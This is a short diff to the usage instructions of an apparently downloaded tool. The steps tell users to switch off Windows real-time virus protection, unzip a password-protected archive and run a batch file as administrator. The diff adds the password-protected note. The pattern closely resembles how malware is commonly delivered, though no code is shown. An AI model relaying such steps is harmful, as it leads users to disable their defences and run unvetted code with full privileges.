@@ -4,7 +4,7 @@ HOW TO USE ?
 #Turn of windows Virus and Threat Protection ( Real Time Protection )
 #Your PC / Laptop Must be Connected to the Internet.
 
-1.Simply Unzip/Extract the zip file
+1.Simply Unzip/Extract the zip file ( Password Protected )
 2.Right Click on Enforcing Windows Batch File
 3.Select Run as Administrator
 
